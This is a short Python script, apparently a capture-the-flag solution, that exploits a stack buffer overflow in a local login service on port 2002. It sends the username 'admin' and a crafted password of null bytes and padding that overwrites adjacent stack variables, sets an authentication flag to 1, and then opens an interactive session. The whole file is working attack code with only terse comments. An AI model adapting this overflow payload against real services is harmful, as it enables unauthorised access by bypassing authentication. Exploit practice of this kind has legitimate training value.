#!/usr/bin/python3

import socket
import telnetlib

s = socket.create_connection(('localhost', 2002))

username = b'admin\n'
s.send(username)

password = b'\x00'*24 # Overwrite the password field
password += 0x0.to_bytes(8, 'little') # Overwrite the next 2 int variables
password += b'a'*12 # Overwrite the pointer variable (for some reason 12 bytes on the stack)
password += 0x1.to_bytes(4, 'little') # Set local_c to 1
password += b'\n'
s.send(password)

t = telnetlib.Telnet()
t.sock = s
t.interact()



s.close()
